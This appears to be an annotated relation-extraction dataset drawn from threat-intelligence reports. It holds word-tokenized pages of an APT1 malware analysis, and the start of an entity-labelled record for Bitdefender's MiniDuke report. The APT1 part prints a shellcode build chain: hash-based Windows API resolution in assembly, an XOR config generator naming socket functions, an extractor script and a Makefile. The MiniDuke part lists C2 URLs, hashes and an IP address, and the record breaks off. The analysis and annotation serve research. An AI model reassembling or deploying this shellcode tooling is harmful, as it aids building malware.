"=", "offset", "to", "ADdressOfNames", ")", "add", "eax", ",", "dword", "[", "ebp"], ["+", "0x08", "]", "mov"], ["[", "ebp", "-", "0x04", "]", ",", "eax", ";", "save", "it", "!", ";", "start", "looking", "for", "names", "!"], ["xor", "ecx", ",", "ecx", "getprocaddrbyhash_loop_names", ":", "mov", "edx", ",", "[", "ebp", "-", "0x08", "]", ";", "EAT", "cmp", "ecx", ",", "[", "edx", "+", "0x18", "]", ";", "NumberOfNames", "jge", "getprocaddrbyhash_failed", ";", "not", "find", "we", "failed", ";", "find", "the", "mov", "ebx", ",", "mov", "ebx", ",", "add", "ebx", ",", "address", "of", "the", "function", "name"], ["[", "ebp", "-", "0x04", "]", ";"], ["AddressOfNames"], ["[", "ebx", "+", "ecx", "*", "4", "]", ";", "RVA", "of", "string"], ["[", "ebp", "+", "0x08", "]", ";", "compare", "'em", "!"], [";", "push", "dword", "[", "ebp", "+", "0x0C", "]", ";", "FunctionName", "push", "ebx", ";", "name", "of", "entry", "call", "FNV1HashStr", "add", "esp", ",", "4", "cmp", "eax", ",", "dword", "[", "ebp", "+", "0x0C", "]"], ["je", "getprocaddrbyhash_found_api", "inc", "jmp", "ecx"], ["getprocaddrbyhash_loop_names", "getprocaddrbyhash_found_api", ":", ";", "-----------------------------------------------------", ";", "success", "!"], ["now", "all", "that", "'s", "left", "is", "to", "go", "from", "the", ";"], ["AddressOfNames", "index", "to", "the", "AddressOfFunctions", "index", ";"], ["----------------------------------------------------", ";"], ["First", "thing", "'s", "mov", "eax", ",", "[", "ebp", "mov", "eax", ",", "[", "eax", "add", "eax", ",", "[", "ebp", "first", ",", "find", "the", "AddressOfNameOrdinals", "address", "-", "0x08", "]", "+", "0x24", "]", ";", "AddressOfNameOrdinals", "offset"], ["+", "0x08", "]", ";", "Now", "we", "got", "ta", "look", "up", "the", "ordinal", "corresponding", "to", "our", "api", "xor", "ebx", ",", "ebx", "mov", "bx", ",", "[", "eax", "+", "ecx", "*", "2", "]", ";", "ecx", "*", "2", "because", "it", "'s", "an", "array", "of", "WORDS", ";"], ["Next", "we", "find", "the", "AddressOfFunctions", "array", "mov", "eax", ",", "[", "ebp", "-", "0x08", "]", "mov", "eax", ",", "[", "eax", "+", "0x1C", "]", ";", "AddressOfFunctions", "offset", "add", "eax", ",", "[", "ebp", "+", "0x08", "]", ";", "and", "last", "we", "find", "the", "address", "of", "our", "api", "!"], ["Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "45", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "mov", "eax", ",", "[", "eax", "+", "ebx", "*", "4", "]", "add", "eax", ",", "[", "ebp", "+", "0x08", "]", "jmp", "getprocaddrbyhash_end", "getprocaddrbyhash_failed", ":", "xor", "eax", ",", "eax", "getprocaddrbyhash_end", ":", "pop", "ebx", "mov", "esp", ",", "ebp", "pop", "ebp", "ret", "gen_conf.py", ":", "import", "struct"], ["struct_global", "=", "''", "'", "#", "ifndef", "_", "_", "GLOBAL", "_", "_", "#", "define", "_", "_", "GLOBAL", "_", "_", "#", "include", "\"", "fct.h", "\"", "typedef", "struct", "{"], ["%", "s", "sVirtualAlloc", "VirtualAlloc", ";", "sLoadLibraryA", "LoadLibraryA", ";", "sclosesocket", "closesocket", ";", "sgetsockname", "getsockname", ";", "srecv", "recv", ";", "sWSAStartup", "WSAStartup", ";", "ssocket", "socket", ";", "slisten", "listen", ";", "sbind", "bind", ";", "saccept", "accept", ";", "}", "s_config", ";", "void", "init_config(s_config", "*", "config", ")", ";", "#", "endif", "'", "''"], ["config", "=", "{", "'", "sws32", "'", ":", "{", "'", "value", "'", ":", "\"", "ws2_32.dll", "\"", ",", "'", "type", "'", ":", "\"", "char", "\"", ",", "}", ",", "}"], ["filename_header", "=", "\"", "global.h", "\"", "filename_source", "=", "\"", "global.c", "\"", "def", "xor(data", ",", "key", "):", "#", "ret", "=", "''"], ["#", "for", "i", "in", "range(len(data", ")", "):", "#", "c", "=", "ord(data[i", "]", ")", "^", "ord(key[i%len(key", ")", "]", ")"], ["#", "ret", "+", "=", "chr(c", ")", "return", "ret", "def", "stack(var", ",", "name", ",", "value", ",", "key", "="], ["None", "):", "ret", "=", "''", "l", "=", "len(value", ")", "for", "i", "in", "range", "(", "0", ",", "l", ",", "4", "):", "v", "=", "value[i", ":", "i+4", "]", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "46", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "v", "=", "struct.unpack('I", "'", ",", "v)[0", "]", "ret", "+", "=", "\"", "*", "(", "unsigned", "int", "*", ")", "(", "%", "s->%s", "+", "%", "d", ")", "=", "%", "d;\\n", "\"", "%", "(", "var", ",", "name", ",", "i", ",", "v", ")", "ret", "+", "=", "\"", "%", "s->%s_len", "=", "%", "d;\\n", "\"", "%", "(", "var", ",", "name", ",", "return", "ret", "len(value.strip('\\00", "'", ")", ")", ")"], ["def", "gen_source(conf", ",", "header", "):", "source", "=", "\"", "\"", "\"", "#", "include", "\"", "%", "s", "\"", "inline", "void", "init_config(s_config", "*", "config", ")", "{", "\"", "\"", "\"", "%", "(", "header", ")", "for", "k", ",", "v", "in", "conf.items", "(", "):", "#", "if", "k", "!"], ["=", "'", "key", "'", ":", "#", "source", "+", "=", "stack('config", "'", ",", "k", ",", "v['value", "'", "]", ",", "config['key']['value", "'", "]", ")"], ["#", "else", ":", "source", "+", "=", "stack('config", "'", ",", "k", ",", "v['value", "'", "]", ")", "source", "+", "=", "\"", "}", "\"", "return", "source", "def", "gen_header(conf", "):", "h", "=", "''", "for", "k", ",", "v", "in", "conf.items", "(", "):", "if", "v['type", "'", "]", "=", "=", "'", "char", "'", ":", "h", "+", "=", "\"", "%", "s", "%", "s[%d];\\n", "\"", "%", "(", "v['type", "'", "]", ",", "k", ",", "len(v['value", "'", "]", ")", ")"], ["h", "+", "=", "\"", "unsigned", "int", "%", "s_len;\\n", "\"", "%", "(", "k", ")"], ["ret", "="], ["struct_global", "%", "h", "return", "ret", "def", "prepare_config(conf", "):", "for", "key", ",", "value", "in", "conf.items", "(", "):", "#", "if", "key", "!"], ["=", "'", "key", "'", ":", "#", "value['value", "'", "]", "=", "xor(value['value", "'", "]", ",", "conf['key']['value", "'", "]", ")", "+", "\"", "\\x00", "\"", "l", "=", "len(value['value", "'", "]", ")"], ["if", "l", "%", "4", "!", "=", "0", ":", "value['value", "'", "]", "+", "=", "\"", "\\x00", "\"", "*", "(", "4-(l%4", ")", ")"], ["conf[key"], ["]", "=", "value", "return", "conf", "config", "=", "prepare_config(config", ")", "source", "=", "gen_source(config", ",", "filename_header", ")", "header", "=", "gen_header(config", ")", "open(filename_source,'w').write(source", ")", "open(filename_header,'w').write(header", ")", "shellcode.py", "import", "subprocess", "import", "sys", "def", "extract_shellcode(f", "):", "ret", "=", "''", "cmd", "=", "\"", "i486", "-", "mingw32", "-", "objdump", "-s", "%", "s", "|", "tail", "-n+5", "\"", "%", "(", "f", ")", "data", "=", "subprocess.check_output(cmd", ",", "shell", "=", "True", ",", "stderr", "="], ["None", ")", "data", "=", "data.split(\"Contents", "of", "section", "\"", ")"], ["[", "0].strip('\\n", "'", ")", "lines", "=", "data.split('\\n", "'", ")", "for", "l", "in", "lines", ":", "cols", "=", "l.split", "(", "'", "'", ")"], ["ret", "+", "=", "cols[2", "]", "+", "cols[3", "]", "+", "cols[4", "]", "+", "cols[5", "]", "return", "ret.decode('hex')[:-0x10", "]", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "47", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "if", "_", "_", "name", "_", "_", "=", "=", "\"", "_", "_", "main", "_", "_", "\"", ":", "shellcode", "=", "extract_shellcode(sys.argv[1", "]", ")"], ["sys.stdout.write(shellcode", ")"], ["Makefile", ":", "BIN_WIN"], ["=", "global.c", "main.exe", "shellcode.bin", "CC_WIN", "=", "i486", "-", "mingw32", "-", "gcc", "LD_WIN", "=", "i486", "-", "mingw32", "-", "ld", "STRIP_WIN", "=", "i486", "-", "mingw32", "-", "strip", "CFLAGS_WIN", "=", "-Os"], ["-pie"], ["#", "-falign", "-", "functions=1", "-falign", "-", "loops=1", "-falign", "-", "jumps=1", "LDFLAGS_WIN"], ["=", "--dynamicbase", "--nxcompat", "--enable", "-", "stdcall", "-", "fixup", "AC", "=", "nasm"], ["AFLAGS_WIN", "=", "-f", "win32", "--prefix", "_", "#", "nasm", "flag", "all", ":", "$", "(", "BIN_WIN", ")", "global.c", ":"], ["python", "gen_conf.py", "#", "astyle", "global.h", "global.c"], ["%", ".obj"], [":", "%", ".asm"], ["$", "(", "AC", ")", "$", "(", "AFLAGS_WIN", ")", "-o", "$", "@", "$", "<", "%", ".obj"], [":", "%", ".c", "$", "(", "CC_WIN", ")", "-o", "$", "@", "$", "(", "CFLAGS_WIN", ")", "-c", "$", "<", "main.exe", ":", "main.obj", "global.obj", "winutils.obj", "hash.obj", "$", "(", "LD_WIN", ")", "$", "(", "LDFLAGS_WIN", ")", "-e", "_", "_", "main", "--subsystem", "windows", "-o", "$", "@", "$", "^", "$", "(", "STRIP_WIN", ")", "$", "^"], ["shellcode.bin", ":", "main.exe", "python", "shellcode.py", "main.exe", ">", "shellcode.bin", "c", ":", "rm", "-f", "*", ".o"], ["*", ".obj"], ["clean", ":", "rm", "-f", "*", ".o"], ["*", ".obj"], ["$", "(", "BIN", ")", "$", "(", "BIN_WIN", ")", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "48", "of", "48"]]}, {"vertexSet": [[{"name": "MiniDuke", "pos": [4, 5], "sent_id": 0, "type": "Malware"}], [{"name": "MiniDuke", "pos": [9, 10], "sent_id": 0, "type": "Malware"}], [{"name": "Marius TIVADAR", "pos": [11, 13], "sent_id": 0, "type": "Person"}], [{"name": "B\u00edr\u00f3 BAL\u00c1ZS", "pos": [19, 21], "sent_id": 0, "type": "Person"}], [{"name": "Cristian ISTRATE", "pos": [0, 2], "sent_id": 2, "type": "Person"}], [{"name": "February 27 2013", "pos": [6, 9], "sent_id": 3, "type": "Time"}], [{"name": "June 2011", "pos": [7, 9], "sent_id": 4, "type": "Time"}], [{"name": "MiniDuke", "pos": [5, 6], "sent_id": 7, "type": "Organization"}], [{"name": "MiniDuke", "pos": [5, 6], "sent_id": 80, "type": "Malware"}], [{"name": "2012", "pos": [11, 12], "sent_id": 84, "type": "Time"}], [{"name": "CVE-2011-2462", "pos": [0, 3], "sent_id": 85, "type": "Vulnerability"}], [{"name": "2013", "pos": [3, 4], "sent_id": 85, "type": "Time"}], [{"name": "CVE-2013-0640", "pos": [0, 3], "sent_id": 86, "type": "Vulnerability"}], [{"name": "2013", "pos": [24, 25], "sent_id": 119, "type": "Time"}], [{"name": "tempfile.dat", "pos": [20, 21], "sent_id": 132, "type": "File"}], [{"name": "MiniDuke", "pos": [5, 6], "sent_id": 137, "type": "Malware"}], [{"name": "MiniDuke", "pos": [5, 6], "sent_id": 180, "type": "Malware"}], [{"name": "MiniDuke", "pos": [5, 6], "sent_id": 220, "type": "Malware"}], [{"name": "ObamaApril", "pos": [0, 1], "sent_id": 221, "type": "Indicator"}], [{"name": "Etoursinfo", "pos": [0, 1], "sent_id": 222, "type": "Indicator"}], [{"name": "RuthHarper14", "pos": [0, 1], "sent_id": 223, "type": "Indicator"}], [{"name": "CurtinDiana", "pos": [1, 2], "sent_id": 223, "type": "Indicator"}], [{"name": "trulrich", "pos": [2, 3], "sent_id": 223, "type": "Indicator"}], [{"name": "zokath", "pos": [3, 4], "sent_id": 223, "type": "Indicator"}], [{"name": "KellyPalmer20", "pos": [5, 6], "sent_id": 223, "type": "Indicator"}], [{"name": "EdithAlbert1", "pos": [0, 1], "sent_id": 224, "type": "Indicator"}], [{"name": "FontenotHoward", "pos": [1, 2], "sent_id": 224, "type": "Indicator"}], [{"name": "JennieCartagena", "pos": [0, 1], "sent_id": 225, "type": "Indicator"}], [{"name": "LorindaRay1", "pos": [1, 2], "sent_id": 225, "type": "Indicator"}], [{"name": "TinaPena10", "pos": [0, 1], "sent_id": 226, "type": "Indicator"}], [{"name": "uri!wp07VkkxYt3Ag/bdbNgi3smPJvX7+HLEw5H6/S0RsmHKtA==", "pos": [9, 14], "sent_id": 227, "type": "Obfuscation"}], [{"name": "MiniDuke", "pos": [7, 8], "sent_id": 242, "type": "Malware"}], [{"name": "zZkadfDljFE94fFa", "pos": [0, 1], "sent_id": 245, "type": "Indicator"}], [{"name": "DFJ2dskl2394FDLI", "pos": [0, 1], "sent_id": 246, "type": "Indicator"}], [{"name": "9LidWIdf230DFkdL", "pos": [0, 1], "sent_id": 247, "type": "Indicator"}], [{"name": "zZkOERmcrD94fFLa", "pos": [0, 1], "sent_id": 248, "type": "Indicator"}], [{"name": "666wifjDfjalQWLK", "pos": [0, 1], "sent_id": 249, "type": "Indicator"}], [{"name": "lUFujJFDiufLKWPR", "pos": [2, 3], "sent_id": 249, "type": "Indicator"}], [{"name": "HkyeiIDKiroLaKYr", "pos": [3, 4], "sent_id": 249, "type": "Indicator"}], [{"name": "HJUlredIREYUkLLa", "pos": [0, 1], "sent_id": 250, "type": "Indicator"}], [{"name": "lUFEfiHKDroLaKYr", "pos": [1, 2], "sent_id": 250, "type": "Indicator"}], [{"name": "HJUlOIDIREYUkLLa", "pos": [2, 3], "sent_id": 250, "type": "Indicator"}], [{"name": "lUFEfiHKljfLKWPR", "pos": [3, 4], "sent_id": 250, "type": "Indicator"}], [{"name": "MiniDuke", "pos": [14, 15], "sent_id": 254, "type": "Malware"}], [{"name": "http://afgcall.com/demo/index.php", "pos": [2, 3], "sent_id": 264, "type": "Indicator"}], [{"name": "http://hottraveljobs.com/forum/docs/info.php", "pos": [5, 6], "sent_id": 264, "type": "Indicator"}], [{"name": "http://arabooks.ch/events/", "pos": [2, 3], "sent_id": 266, "type": "Indicator"}], [{"name": "http://tsoftonline.com/conf/", "pos": [5, 6], "sent_id": 266, "type": "Indicator"}], [{"name": "http://www.tsoftonline.com/engine/", "pos": [8, 9], "sent_id": 266, "type": "Indicator"}], [{"name": "http://tsoftonline.com/views/", "pos": [2, 3], "sent_id": 267, "type": "Indicator"}], [{"name": "http://arabooks.ch/lib/", "pos": [2, 3], "sent_id": 268, "type": "Indicator"}], [{"name": "http://arabooks.ch/srch/", "pos": [2, 3], "sent_id": 269, "type": "Indicator"}], [{"name": "http://artas.org/engine/", "pos": [5, 6], "sent_id": 269, "type": "Indicator"}], [{"name": "Indonesia", "pos": [17, 18], "sent_id": 275, "type": "Country"}], [{"name": "Middle East", "pos": [19, 21], "sent_id": 275, "type": "Region"}], [{"name": "uri!wp07VkkxYt3Ag/bdbNgi3smPJvX7+HLEw5H6/S0RsmHKtA==", "pos": [1, 6], "sent_id": 277, "type": "Indicator"}], [{"name": "uri!wp07VkkxYmHJnTtmuxrvY8ST8m6It3LjiYEnZvz4Yl/JezdMPBkw5IiVC1al.", "pos": [1, 5], "sent_id": 278, "type": "Indicator"}], [{"name": "uri!wp07VkkxYt3Md/JOnLhzRL2FJv0N9zJnzRNp", "pos": [0, 3], "sent_id": 282, "type": "Indicator"}], [{"name": "uri!wp07VkkxYmfNkwN2nBmx4ch/Iu2c+GLeyZEDTKU=", "pos": [4, 7], "sent_id": 282, "type": "Indicator"}], [{"name": "uri!wp07VkkxYujRoyJ23DkwZ8mRGx6M9yLeyY8m/Yw48GS/E2k=", "pos": [7, 12], "sent_id": 283, "type": "Indicator"}], [{"name": "uri!wp07VkkxYmfNkwN2nBmx4ch/Iu2c+GJow39HbphL", "pos": [0, 3], "sent_id": 287, "type": "Indicator"}], [{"name": "uri!wp07VkkxYt3Md/JOnLhzRL2FJjY8l2It", "pos": [0, 3], "sent_id": 290, "type": "Indicator"}], [{"name": "uri!wp07VkkxYt3Md/JOnLhzRL2FJm7Mt7DEWg==", "pos": [5, 8], "sent_id": 291, "type": "Indicator"}], [{"name": "uri!wp07VkkxYt3Mne5uiDkz4Il/Iw48Ge/EWg==", "pos": [0, 5], "sent_id": 294, "type": "Indicator"}], [{"name": "?a=MjIzMTQyMzkzM3xST3xIT01FL0hPTUV8NXwxfDN8MXwwfC18LXwyLjEy&g=MjIzMTQy M.", "pos": [10, 17], "sent_id": 304, "type": "Indicator"}], [{"name": "winupdt.exe", "pos": [36, 37], "sent_id": 315, "type": "Payload"}], [{"name": "wcsntfy.exe", "pos": [38, 39], "sent_id": 315, "type": "Payload"}], [{"name": "netmngr.exe", "pos": [40, 41], "sent_id": 315, "type": "Payload"}], [{"name": "dumpreport.exe", "pos": [42, 43], "sent_id": 315, "type": "Payload"}], [{"name": "taskhosts.exe", "pos": [44, 45], "sent_id": 315, "type": "Payload"}], [{"name": "wupdmngr.exe", "pos": [46, 47], "sent_id": 315, "type": "Payload"}], [{"name": "winhlp.exe", "pos": [48, 49], "sent_id": 315, "type": "Payload"}], [{"name": "dllhosts.exe", "pos": [50, 51], "sent_id": 315, "type": "Payload"}], [{"name": "dxdiagupd.exe", "pos": [52, 53], "sent_id": 315, "type": "Payload"}], [{"name": "dialers.exe", "pos": [54, 55], "sent_id": 315, "type": "Payload"}], [{"name": "netschd.exe", "pos": [56, 57], "sent_id": 315, "type": "Payload"}], [{"name": "connwiz.exe", "pos": [58, 59], "sent_id": 315, "type": "Payload"}], [{"name": "certupdt.exe", "pos": [60, 61], "sent_id": 315, "type": "Payload"}], [{"name": "repfault.exe", "pos": [62, 63], "sent_id": 315, "type": "Payload"}], [{"name": "wuapreport.exe", "pos": [64, 65], "sent_id": 315, "type": "Payload"}], [{"name": "lanmgr.exe", "pos": [66, 67], "sent_id": 315, "type": "Payload"}], [{"name": "XOR operation", "pos": [10, 12], "sent_id": 322, "type": "Obfuscation"}], [{"name": "http://hottraveljobs.com/forum/docs/info.php", "pos": [4, 5], "sent_id": 326, "type": "Indicator"}], [{"name": "<CRC>|base64|<size>|<md5>", "pos": [3, 6], "sent_id": 329, "type": "Indicator"}], [{"name": "2011/06/20", "pos": [1, 2], "sent_id": 344, "type": "Time"}], [{"name": "2011/10/13", "pos": [4, 5], "sent_id": 345, "type": "Time"}], [{"name": "2012/05/14", "pos": [1, 2], "sent_id": 350, "type": "Time"}], [{"name": "2012/05/21", "pos": [6, 7], "sent_id": 350, "type": "Time"}], [{"name": "2012/05/23", "pos": [11, 12], "sent_id": 350, "type": "Time"}], [{"name": "2012/06/06", "pos": [16, 17], "sent_id": 350, "type": "Time"}], [{"name": "2012/09/04", "pos": [21, 22], "sent_id": 350, "type": "Time"}], [{"name": "2012/12/26", "pos": [26, 27], "sent_id": 350, "type": "Time"}], [{"name": "2013/02/12", "pos": [10, 11], "sent_id": 355, "type": "Time"}], [{"name": "2013/02/20", "pos": [15, 16], "sent_id": 355, "type": "Time"}], [{"name": "2013/02/20", "pos": [20, 21], "sent_id": 355, "type": "Time"}], [{"name": "2013/02/20", "pos": [25, 26], "sent_id": 355, "type": "Time"}], [{"name": "2013/02/21", "pos": [30, 31], "sent_id": 355, "type": "Time"}], [{"name": "2013/02/21", "pos": [35, 36], "sent_id": 355, "type": "Time"}], [{"name": "2013/02/21", "pos": [40, 41], "sent_id": 355, "type": "Time"}], [{"name": "2013/02/21", "pos": [45, 46], "sent_id": 355, "type": "Time"}], [{"name": "2013/02/26", "pos": [50, 51], "sent_id": 355, "type": "Time"}], [{"name": "OllyDbg", "pos": [22, 23], "sent_id": 363, "type": "Software"}], [{"name": "IDA", "pos": [24, 25], "sent_id": 363, "type": "Software"}], [{"name": "Process Monitor", "pos": [26, 28], "sent_id": 363, "type": "Software"}], [{"name": "1e1b0d16a16cf5c7f3a7c053ce78f515", "pos": [16, 17], "sent_id": 372, "type": "MD5"}], [{"name": "2012-03-05", "pos": [18, 23], "sent_id": 372, "type": "Time"}], [{"name": "b029378966d2694f8abd51f0d6c7822a", "pos": [23, 24], "sent_id": 372, "type": "MD5"}], [{"name": "2012-06-15", "pos": [25, 30], "sent_id": 372, "type": "Time"}], [{"name": "53db085a276ebbf5798ba756cac833ea", "pos": [30, 31], "sent_id": 372, "type": "MD5"}], [{"name": "2013-02-22", "pos": [32, 37], "sent_id": 372, "type": "Time"}], [{"name": "HKCU\\Software\\Microsoft\\ApplicationManager with a value of AppID", "pos": [0, 6], "sent_id": 378, "type": "Indicator"}], [{"name": "1e1b0d16a16cf5c7f3a7c053ce78f515", "pos": [17, 18], "sent_id": 427, "type": "MD5"}], [{"name": "2012-03-05", "pos": [19, 24], "sent_id": 427, "type": "Time"}], [{"name": "news.grouptumbler.com/news/feed.php", "pos": [24, 25], "sent_id": 427, "type": "Indicator"}], [{"name": "b029378966d2694f8abd51f0d6c7822a", "pos": [25, 26], "sent_id": 427, "type": "MD5"}], [{"name": "2012-06-15", "pos": [27, 32], "sent_id": 427, "type": "Time"}], [{"name": "info.leveldelta.com/php/text.php", "pos": [32, 33], "sent_id": 427, "type": "Indicator"}], [{"name": "53db085a276ebbf5798ba756cac833ea", "pos": [33, 34], "sent_id": 427, "type": "MD5"}], [{"name": "2013-02-22", "pos": [35, 40], "sent_id": 427, "type": "Time"}], [{"name": "info.leveldelta.com/php/text.php", "pos": [40, 41], "sent_id": 427, "type": "Indicator"}], [{"name": "626489f8cafacb1b24fe6ecf0db52f23", "pos": [0, 1], "sent_id": 441, "type": "MD5"}], [{"name": "3979106736.gif", "pos": [5, 6], "sent_id": 442, "type": "File"}], [{"name": "6bc34809e44c40b61dd29e0a387ee682", "pos": [0, 1], "sent_id": 443, "type": "MD5"}], [{"name": "85.95.236.114", "pos": [10, 11], "sent_id": 450, "type": "Address"}], [{"name": "XOR", "pos": [4, 5], "sent_id": 452, "type": "Obfuscation"}], [{"name": "AES encryption", "pos": [6, 8], "sent_id": 456, "type": "Obfuscation"}], [{"name": "85.95.236.114", "pos": [8, 9], "sent_id": 464, "type": "Address"}], [{"name": "Turkey", "pos": [2, 3], "sent_id": 465, "type": "Country"}], [{"name": "Deniz Tosun", "pos": [4, 6], "sent_id": 469, "type": "Person"}]], "labels": [{"r": "P33", "h": 1, "t": 6, "evidence": [0, 4]}, {"r": "P7", "h": 8, "t": 10, "evidence": [80, 85]}, {"r": "P7", "h": 8, "t": 12, "evidence": [80, 86]}, {"r": "P33", "h": 8, "t": 9, "evidence": [80, 84]}, {"r": "P33", "h": 8, "t": 11, "evidence": [80, 85]}, {"r": "P13", "h": 17, "t": 30, "evidence": [220, 227]}, {"r": "P21", "h": 55, "t": 0, "evidence": [0, 277]}, {"r": "P21", "h": 56, "t": 0, "evidence": [0, 278]}, {"r": "P21", "h": 57, "t": 0, "evidence": [0, 282]}, {"r": "P21", "h": 58, "t": 0, "evidence": [0, 282]}, {"r": "P21", "h": 59, "t": 0, "evidence": [0, 283]}, {"r": "P21", "h": 60, "t": 0, "evidence": [0, 287]}, {"r": "P21", "h": 61, "t": 0, "evidence": [0, 290]}, {"r": "P21", "h": 62, "t": 0, "evidence": [0, 291]}, {"r": "P21", "h": 63, "t": 0, "evidence": [0, 294]}, {"r": "P21", "h": 64, "t": 0, "evidence": [0, 304]}, {"r": "P21", "h": 44, "t": 0, "evidence": [0, 264]}, {"r": "P21", "h": 45, "t": 0, "evidence": [0, 264]}, {"r": "P21", "h": 46, "t": 0, "evidence": [0, 266]}, {"r": "P21", "h": 47, "t": 0, "evidence": [0, 266]}, {"r": "P21", "h": 48, "t": 0, "evidence": [0, 266]}, {"r": "P21", "h": 49, "t": 0, "evidence": [0, 267]}, {"r": "P21", "h": 50, "t": 0, "evidence": [0, 268]}, {"r": "P21", "h": 51, "t": 0, "evidence": [0, 269]}, {"r": "P21", "h": 52, "t": 0, "evidence": [0, 269]}, {"r": "P21", "h": 32, "t": 0, "evidence": [0, 245]}, {"r": "P21", "h": 33, "t": 0, "evidence": [0, 246]}, {"r": "P21", "h": 34, "t": 0, "evidence": [0, 247]}, {"r": "P21", "h": 35, "t": 0, "evidence": [0, 248]}, {"r": "P21", "h": 36, "t": 0, "evidence": [0, 249]}, {"r": "P21", "h": 37, "t": 0, "evidence": [0, 249]}, {"r": "P21", "h": 38, "t": 0, "evidence": [0, 249]}, {"r": "P21", "h": 39, "t": 0, "evidence": [0, 250]}, {"r": "P21", "h": 40, "t": 0, "evidence": [0, 250]}, {"r": "P21", "h": 41, "t": 0, "evidence": [0, 250]}, {"r": "P21", "h": 42, "t": 0, "evidence": [0, 250]}, {"r": "P21", "h": 18, "t": 0, "evidence": [0, 221]}, {"r": "P21", "h": 19, "t": 0, "evidence": [0, 222]}, {"r": "P21", "h": 20, "t": 0, "evidence": [0, 223]}, {"r": "P21", "h": 21, "t": 0, "evidence": [0, 223]}, {"r": "P21", "h": 22, "t": 0, "evidence": [0, 223]}, {"r": "P21", "h": 23, "t": 0, "evidence": [0, 223]}, {"r": "P21", "h": 24, "t": 0, "evidence": [0, 223]}, {"r": "P21", "h": 25, "t": 0, "evidence": [0, 224]}, {"r": "P21", "h": 26, "t": 0, "evidence": [0, 224]}, {"r": "P21", "h": 27, "t": 0, "evidence": [0, 225]}, {"r": "P21", "h": 28, "t": 0, "evidence": [0, 225]}, {"r": "P21", "h": 29, "t": 0, "evidence": [0, 226]}, {"r": "P21", "h": 14, "t": 0, "evidence": [0, 132]}, {"r": "P21", "h": 82, "t": 0, "evidence": [0, 326]}, {"r": "P21", "h": 83, "t": 0, "evidence": [0, 329]}, {"r": "P21", "h": 120, "t": 0, "evidence": [0, 441]}, {"r": "P21", "h": 122, "t": 0, "evidence": [0, 443]}, {"r": "P21", "h": 121, "t": 0, "evidence": [0, 442]}, {"r": "P21", "h": 113, "t": 0, "evidence": [0, 427]}, {"r": "P21", "h": 116, "t": 0, "evidence": [0, 427]}, {"r": "P21", "h": 119, "t": 0, "evidence": [0, 427]}, {"r": "P21", "h": 110, "t": 0, "evidence": [0, 378]}, {"r": "P21", "h": 111, "t": 0, "evidence": [0, 427]}, {"r": "P21", "h": 114, "t": 0, "evidence": [0, 427]}, {"r": "P21", "h": 117, "t": 0, "evidence": [0, 427]}, {"r": "P33", "h": 0, "t": 84, "evidence": [0, 344]}, {"r": "P33", "h": 0, "t": 85, "evidence": [0, 345]}, {"r": "P33", "h": 0, "t": 86, "evidence": [0, 350]}, {"r": "P33", "h": 0, "t": 87, "evidence": [0, 350]}, {"r": "P33", "h": 0, "t": 88, "evidence": [0, 350]}, {"r": "P33", "h": 0, "t": 89, "evidence": [0, 350]}, {"r": "P33", "h": 0, "t": 90, "evidence": [0, 350]}, {"r": "P33", "h": 0, "t": 91, "evidence": [0, 350]}, {"r": "P33", "h": 0, "t": 92, "evidence": [0, 355]}, {"r": "P33", "h": 0, "t": 93, "evidence": [0, 355]}, {"r": "P33", "h": 0, "t": 94, "evidence": [0, 355]}, {"r": "P33", "h": 0, "t": 95, "evidence": [0, 355]}, {"r": "P33", "h": 0, "t": 96, "evidence": [0, 355]}, {"r": "P33", "h": 0, "t": 97, "evidence": [0, 355]}, {"r": "P33", "h": 0, "t": 98, "evidence": [0, 355]}, {"r": "P33", "h": 0, "t": 105, "evidence": [0, 372]}, {"r": "P33", "h": 0, "t": 107, "evidence": [0, 372]}, {"r": "P33", "h": 0, "t": 109, "evidence": [0, 372]}, {"r": "P33", "h": 0, "t": 99, "evidence": [0, 355]}, {"r": "P33", "h": 0, "t": 100, "evidence": [0, 355]}, {"r": "P33", "h": 0, "t": 112, "evidence": [0, 427]}, {"r": "P33", "h": 0, "t": 115, "evidence": [0, 427]}, {"r": "P33", "h": 0, "t": 118, "evidence": [0, 427]}, {"r": "P13", "h": 0, "t": 65, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 66, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 67, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 68, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 69, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 70, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 71, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 72, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 73, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 74, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 75, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 76, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 77, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 78, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 79, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 80, "evidence": [0, 315]}, {"r": "P13", "h": 0, "t": 81, "evidence": [0, 322]}, {"r": "P13", "h": 0, "t": 124, "evidence": [0, 452]}, {"r": "P13", "h": 0, "t": 125, "evidence": [0, 456]}], "title": "201304BitdefenderMiniDuke", "sents": [["A", "Closer", "Look", "at", "MiniDuke", "A", "Closer", "Look", "at", "MiniDuke", "Authors", "Marius", "TIVADAR", "\u2013", "Team", "Leader", ",", "Malware", "Research", "B\u00edr\u00f3", "BAL\u00c1ZS", "\u2013"], ["Malware", "Researcher"], ["Cristian", "ISTRATE", "\u2013", "Malware", "Researcher", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", 